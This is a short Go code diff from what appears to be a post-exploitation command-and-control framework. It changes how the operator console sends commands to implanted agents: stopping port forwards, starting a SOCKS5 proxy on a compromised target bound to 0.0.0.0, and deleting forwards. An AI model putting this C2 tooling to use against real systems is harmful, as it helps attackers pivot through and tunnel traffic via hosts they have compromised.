@@ -24,7 +24,7 @@ func modulePortFwd() {
 				// tell the agent to close connection
 				// make sure handler returns
 				// cmd format: !port_fwd [to/listen] [shID] [operation]
-				cmd := fmt.Sprintf("%s %s stop stop", emp3r0r_data.C2CmdPortFwd, id)
+				cmd := fmt.Sprintf("%s --shID %s --operation stop", emp3r0r_data.C2CmdPortFwd, id)
 				sendCMDerr := SendCmd(cmd, "", CurrentTarget)
 				if sendCMDerr != nil {
 					CliPrintError("SendCmd: %v", sendCMDerr)
@@ -84,7 +84,7 @@ func moduleProxy() {
 	case "on":
 		// tell agent to start local socks5 proxy
 		cmd_id := uuid.NewString()
-		err = SendCmdToCurrentTarget("!proxy on 0.0.0.0:"+RuntimeConfig.AutoProxyPort, cmd_id)
+		err = SendCmdToCurrentTarget("!proxy --mode on --addr 0.0.0.0:"+RuntimeConfig.AutoProxyPort, cmd_id)
 		if err != nil {
 			CliPrintError("Starting SOCKS5 proxy on target failed: %v", err)
 			return
@@ -128,7 +128,7 @@ func moduleProxy() {
 
 				// tell the agent to close connection
 				// make sure handler returns
-				cmd := fmt.Sprintf("%s %s", emp3r0r_data.C2CmdDeletePortFwd, id)
+				cmd := fmt.Sprintf("%s --id %s", emp3r0r_data.C2CmdDeletePortFwd, id)
 				err := SendCmd(cmd, "", session.Agent)
 				if err != nil {
 					CliPrintError("SendCmd: %v", err)
